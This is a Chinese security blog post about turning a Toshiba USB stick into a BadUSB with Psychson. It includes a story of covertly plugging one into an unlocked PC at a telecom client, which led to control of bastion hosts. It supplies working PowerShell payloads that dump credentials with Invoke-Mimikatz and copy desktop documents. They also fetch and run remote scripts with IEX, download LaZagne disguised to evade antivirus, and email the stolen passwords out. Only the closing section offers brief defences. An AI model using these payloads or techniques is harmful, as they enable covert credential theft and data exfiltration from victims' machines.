# BadUsb----结合实例谈此类外设的风险

0x00 前言
=======

* * *

大概是从今年年初的时候关注了这一块的话题，3月份买的TOSHIBA的U盘进行的测试，期间一直在完善利用代码，期间收到了一些大牛的启发，感谢Psychson这个项目的开源，DM_在PowerShell方面的文章，以及参考过三好学生，jeary等人的配置，虽然并没有交流，但是读了他们的帖子后实践完善了整个利用过程。这是[BadUsb](https://github.com/adamcaudill/Psychson)的GitHub地址,以及原作者的操作视频（YouTube俄语翻译真心栏...自备梯子）

我在某乙方工作，一次去某省级运营商渗透前的交流时，因为来的早会议室还没有腾出来，在安全室休息时，我所坐的位置的人电脑没有锁屏，但是旁边都是安全室的人，这时候我拿出我的BadUsb，默默的去桌子底下系起了鞋带...

0x01 BadUsb制作
=============

* * *

*   首先你需要有一枚2303芯片的U盘，推荐平价的[东芝（TOSHIBA） 速闪系列 U盘 16GB （黑色） USB3.0](http://item.jd.com/929732.html)
*   Psychson项目文件
*   JRE
*   Burner File（BN03V104M.BIN只保证东芝这个U盘可以用）
*   SDCC

[打包下载](http://pan.baidu.com/s/1bniCcEV)，密码: ixgw，包括量产工具，不包含JRE，win7_X64环境的编译好了可以直接用，项目文件夹下有command.txt可以参考，如果你是别的系统版本，请使用vs2012重新编译工具。

**PS：建议就刷我的final.txt修改脚本地址即可，这样不会存在需要重新刷短接芯片的情况，所有操作只需要修改服务器端的脚本即可。如果你已经刷坏，请先在不插电脑时短接住芯片上圆点斜对面的最外两个针脚，然后启动MPALL_F2_v363_0D.exe，用QC.ini，插到usb2.0口，Update几次没有的话说明你短接手法不好，ok了点start刷一下就恢复U盘了，再重头来**

0x02 BadUsb效果
=============

* * *

目前的效果是只需要5秒钟之内，可过某pc装机量5亿的杀软，电脑闪一下屏幕就可以拔下U盘了，剩下的交给后台的PowerShell进程，实现的功能有获取电脑的基本信息，Invoke-mimikatz抓密码，桌面截屏，集成[LaZagne](https://github.com/AlessandroZ/LaZagne)获取系统存储的密码，递归获取桌面所有txt doc类 xls类文件，最终打成压缩包，可通过邮箱或者ftp发送，实战中建议使用ftp发送**ps:因为有人桌面的文档打包出来近GB...**

看我拿本机测试能得到什么

视频密码 HappyTime

![badusb1](http://drops.javaweb.org/uploads/images/1a89902ae6c56b431883ffda8666420fabc41f74.jpg)

![badusb2](http://drops.javaweb.org/uploads/images/4af71ed00dff775e895344f63919756c4ffa5f3b.jpg)

![tree](http://drops.javaweb.org/uploads/images/71c8e0b8322f9d6b35020c53e431081d4894fe2d.jpg)

![doc](http://drops.javaweb.org/uploads/images/319f5fe43d5a7fcb9a9ef46a72e471dea4ef526b.jpg)

![screen](http://drops.javaweb.org/uploads/images/b2e9ca0d104c5e16138cd59beafb5a5d44ffbef0.jpg)

![info](http://drops.javaweb.org/uploads/images/47a4e822f3c85bd609512066beddc2f88d2a0d64.jpg)

![Pass1](http://drops.javaweb.org/uploads/images/a6e03e73fad72a9bba40f87b539e04d270e87ba5.jpg)

![Pass2](http://drops.javaweb.org/uploads/images/e69531d71a49ce895a50979e5ee226a1b18acf93.jpg)

0x03 BadUsb实战
=============

* * *

基本上从视频来看 算上装驱动大概需要10秒时间，实际执行Payload大概是5秒，所以只需要给你5秒，5秒你到底能做到什么?

**友情提醒**

1.  系鞋带动作要自然
2.  速度要快
3.  有小伙伴掩护那是再好不过的

看看我们能得到什么

![doc2](http://drops.javaweb.org/uploads/images/a571f67361b752d8dbb7e683a9f83f5ea416ba84.jpg)

![secret](http://drops.javaweb.org/uploads/images/31e7f4d3246bccd5076e98deee0cfd49b7406517.jpg)

这个数据量有多恐怖，这只是一个安全室普通员工电脑桌面的信息，在后来对这些信息详细分析后发现了堡垒机跳板机的登录密码，以及堡垒机最高权限的账户，至此，该省所有设备都在控制之中，包括短彩信，智能网，长途网，话务网，以及基础设施，都收入囊中。

![login](http://drops.javaweb.org/uploads/images/2e1a33bf01a0afa09c2f4b7dd1af8f06c78e4312.jpg)

![som](http://drops.javaweb.org/uploads/images/c97b759bef43a42963c984c7597672b6236c740c.jpg)

![som2](http://drops.javaweb.org/uploads/images/7d93eab7f58100427e0c594fc6eb80916b7ec6bb.jpg)

![email](http://drops.javaweb.org/uploads/images/7c48792747446239598dd3253213af1d32237895.jpg)

抱歉因为客户原因，无法透露过多细节，读者可当是概念证明，毕竟威胁真实存在。

0x04 BadUsb-Exp
===============

* * *

再次感谢Invoke-Mimikatz作者，感谢DM_，代码为拼接修改而来，照惯例留坑，防伸手党，勿怪 首先，仅通过BadUsb下载一个powershell脚本，其中在调用IEX继续下载新的PowerShell，这样设计是为了先拿到一份LaZagne获取的密码，因为有些人的桌面文档表格太大了，需要等待很久，避免夜长梦多所为。

```
...
...#Invoke-Mimikatz
$folderDateTime = (get-date).ToString('d-M-y HHmmss')
$userDir = (Get-ChildItem env:\userprofile).value + '\Report ' + $folderDateTime
$fileSaveDir = New-Item  ($userDir) -ItemType Directory
Invoke-Mimikatz -Dumpcreds >> $fileSaveDir'/DumpPass.txt'
$copyDir = (Get-ChildItem env:\userprofile).value + '\Desktop'
$copyToDir = New-Item $fileSaveDir'\Doc' -ItemType Directory
Dir -filter *.txt -recurse $copyDir | ForEach-Object {Copy-Item $_.FullName $copyToDir}
Dir -filter *.doc -recurse $copyDir | ForEach-Object {Copy-Item $_.FullName $copyToDir}
Dir -filter *.docx -recurse $copyDir | ForEach-Object {Copy-Item $_.FullName $copyToDir}
Dir -filter *.xls -recurse $copyDir | ForEach-Object {Copy-Item $_.FullName $copyToDir}
Dir -filter *.xlsx -recurse $copyDir | ForEach-Object {Copy-Item $_.FullName $copyToDir}
IEX (New-Object Net.WebClient).DownloadString('http://xxx.xxx.xxx/GetPass.ps1');

```

GetPass.ps1

```
(new-object System.Net.WebClient).DownloadFile('http://x.x.x.x/GetPass.rar','D:\Get.exe');
(new-object System.Net.WebClient).DownloadFile('http://x.x.x.x/Command.rar','D:\Command.bat');
D:\Command.bat;
$SMTPServer = 'smtp.qq.com'
$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
$SMTPInfo.EnableSsl = $true
$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('username', 'password');
$ReportEmail = New-Object System.Net.Mail.MailMessage
$ReportEmail.From = 'email-address'
$ReportEmail.To.Add('To-address')
$ReportEmail.Subject = 'GetPass'
$ReportEmail.Body = 'Passwords In Applications' 
$ReportEmail.Attachments.Add('D:\GetPass.txt')
$SMTPInfo.Send($ReportEmail)
remove-item 'D:\GetPass.txt'
remove-item 'D:\Get.exe'

```

其中的GetPass.rar实为LaZagne，直接下载exe会被大部分杀软拦截，所以使用重命名功能，之所以调用了一个批处理，是因为LaZagne的获取Windows密码模块（非sysadmin模块）注入Lsass进程是会被杀软拦截，所以(D:\Get.exe sysadmin & D:\Get.exe svn & D:\Get.exe database & D:\Get.exe browsers & D:\Get.exe wifi & D:\Get.exe mails) > D:\GetPass.txt 笨方法绕过杀软。

好现在是揭晓坑的时候了- -，破坏了这个脚本删除生成文件的地方~你们插完别人的电脑，这些临时文件就会一直在那里躺着~包括这些密码压缩包喔~

0x05 Sec-Usb？
=============

* * *

既然明白了风险存在，如何防护呢？

Know it，then protect it.

首先看一种暴力的[德国LINDY USB电脑锁 电子信息资料防护加密防盗防窃取](https://item.taobao.com/item.htm?spm=a230r.1.14.11.kKxDoZ&id=35528606576&ns=1&abbucket=19#detail)直接锁死u口，可能适合跳板机，开发机使用，但是个人机器不现实。

再有就是类似sec-usb这种充电线了，断掉usb传输的两个data线，只保留power,这样就只能充电了，某厂商有这种商品，很贵呦~

链接: http://pan.baidu.com/s/1c09E7PQ 密码: 9b6p

0xFF 版权声明
=========

* * *

本文独家首发于乌云知识库(drops.wooyun.org)。本文并没有对任何单位和个人授权转载。如本文被转载，一定是属于未经授权转载，属于严重的侵犯知识产权，本单位将追究法律责任。